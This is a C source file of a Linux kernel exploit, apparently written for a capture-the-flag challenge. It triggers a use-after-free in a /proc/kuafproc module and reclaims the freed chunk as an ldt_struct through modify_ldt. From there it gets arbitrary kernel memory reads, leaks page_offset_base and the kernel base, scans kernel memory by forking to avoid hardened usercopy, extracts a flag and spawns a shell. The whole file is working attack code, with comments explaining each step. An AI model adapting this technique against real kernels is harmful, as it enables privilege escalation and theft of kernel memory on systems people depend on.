//gcc -masm=intel -static exploit.c -o exploit
//home/heap/uaf/ldt_struct/exploit

#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <asm/ldt.h>
#include <stdio.h>
#include <signal.h>
#include <pthread.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <ctype.h>
#include <stdint.h>

struct node {
    uint32_t idx;
    uint32_t size;
    void *buf;
};

struct kuaf_note {
    size_t idx;
    size_t size;
    char* buf;
};

int kuaf_fd;

void err_exit(char *msg)
{
    printf("\033[31m\033[1m[-] %s\033[0m\n", msg);
    exit(EXIT_FAILURE);
}

void kuaf_add(size_t idx, size_t size, char* buf)
{
    struct kuaf_note note = {
        .idx = idx,
        .size = size,
        .buf = buf,
    };
    ioctl(kuaf_fd, 0x112233, &note);
}

void kuaf_edit(size_t idx, char* buf)
{
    struct kuaf_note note = {
        .idx = idx,
        .buf = buf,
    };
    ioctl(kuaf_fd, 0x223344, &note);
}

// kfree(&notebook[idx]->data)
void kuaf_del(size_t idx)
{
    struct kuaf_note note = {
        .idx = idx,
    };
    ioctl(kuaf_fd, 0x334455, &note);
}

int main(int argc, char **argv, char **envp)
{
    struct      user_desc desc;
    uint64_t    page_offset_base = 0xffff880000000000;
    uint64_t    secondary_startup_64;
    uint64_t    kernel_base = 0xffffffff81000000, kernel_offset;
    uint64_t    search_addr, flag_addr = -1;
    uint64_t    temp;
    uint64_t    ldt_buf[0x10];
    char*   buf;
    char    flag[0x100];
    int     pipe_fd[2];
    int     retval;

    cpu_set_t cpu_set;
    // bind to CPU core 0
    CPU_ZERO(&cpu_set);
    CPU_SET(0, &cpu_set);
    sched_setaffinity(0, sizeof(cpu_set), &cpu_set);

    // 打开 proc
    kuaf_fd = open("/proc/kuafproc", O_RDWR);
    if (kuaf_fd < 0) {
        err_exit("Failed to open /proc/kuafproc!");
    }

    // init descriptor info
    desc.base_addr = 0xff0000;
    desc.entry_number = 0x8000 / 8;
    desc.limit = 0;
    desc.seg_32bit = 0;
    desc.contents = 0;
    desc.limit_in_pages = 0;
    desc.lm = 0;
    desc.read_exec_only = 0;
    desc.seg_not_present = 0;
    desc.useable = 0;

    kuaf_add(0, 16, "ccelend");
    kuaf_del(0);
    // write_ldt 系统调用分配 ldt_struct 结构体, use chunk0
    syscall(SYS_modify_ldt, 1, &desc, sizeof(desc));

    // leak kernel direct mapping area by modify_ldt()
    printf("\033[34m\033[1m[*] Start searching for direct mapping area...\033[0m\n");
    while(1) {
        ldt_buf[0] = page_offset_base;
        ldt_buf[1] = 0x8000 / 8;
        kuaf_edit(0, ldt_buf);
        // 读取 page_offset_base 处的值
        retval = syscall(SYS_modify_ldt, 0, &temp, 8);

        if (retval > 0) {
            printf("\033[32m\033[1m[+] Read data: 0x%lx\033[0m\n", temp);
            break;
        }
        else if (retval == 0) {
            err_exit("No mm->context.ldt!");
        }
        page_offset_base += 0x10000000; // linux-5.15: 0x1000000
    }
    printf("\033[32m\033[1m[+] Found page_offset_base: 0x%lx\033[0m\n", page_offset_base);

    // 通过 modify_ldt() 读取 page_offset_base + 0x9d000 处的值
    ldt_buf[0] = page_offset_base + 0x9d000;
    ldt_buf[1] = 0x8000 / 8;
    kuaf_edit(0, ldt_buf);
    syscall(SYS_modify_ldt, 0, &secondary_startup_64, 8);

    kernel_offset = secondary_startup_64 - 0xffffffff81000030;
    kernel_base += kernel_offset;
    printf("\033[32m\033[1m[+] Secondary_startup_64: 0x%lx\033[0m\n", secondary_startup_64);
    printf("\033[32m\033[1m[+] Kernel_base: 0x%lx\033[0m\n", kernel_base);
    printf("\033[32m\033[1m[+] Kernel_offset: 0x%lx\033[0m\n", kernel_offset);

    // 在内核空间中搜索 flag 地址
    search_addr = page_offset_base;
    pipe(pipe_fd);      // 管道用来传递 flag 地址信息
    buf = (char*) mmap(NULL, 0x8000, 
                        PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 
                        0, 0);
    while(1) {
        ldt_buf[0] = search_addr;
        ldt_buf[1] = 0x8000 / 8;
        kuaf_edit(0, ldt_buf);

        // 当进程调用 fork() 时，内核会通过 memcpy() 将父进程的 ldt_struct->entries 上的内容拷贝给子进程
        // 该操作是完全处在内核中的操作，因此不会触发 hardened usercopy 的检查
        int ret = fork();
        if (!ret) 
        {   
            // 子进程
            char* result_addr;
            // 每次读取 0x8000 数据到 buf
            syscall(SYS_modify_ldt, 0, buf, 0x8000);
            // 返回匹配字符串位置的指针
            result_addr = memmem(buf, 0x8000, "cflag{", 6);
            if (result_addr) {
                for (int i = 0; i < 0x100; i++) {
                    if (result_addr[i] == '}') {
                        flag_addr = search_addr + (uint64_t)(result_addr - buf);
                        printf("\033[32m\033[1m[+] Found flag at addr: 0x%lx\033[0m\n", flag_addr);
                    }
                }
            }
            // 子进程向管道写入 flag 地址
            write(pipe_fd[1], &flag_addr, 8);
            exit(0);
        }
        wait(NULL);
        // 主进程从管道读取 flag 地址
        read(pipe_fd[0], &flag_addr, 8);
        if (flag_addr != -1) {
            break;
        }
        search_addr += 0x8000;
    }

    memset(flag, 0, sizeof(flag));
    ldt_buf[0] = flag_addr;
    ldt_buf[1] = 0x8000 / 8;
    kuaf_edit(0, ldt_buf);
    // 读取 flag 内容
    syscall(SYS_modify_ldt, 0, flag, 0x100);

    printf("\033[32m\033[1m[+] Flag is: %s\033[0m\n", flag);
    system("/bin/sh");
    return 0;
}
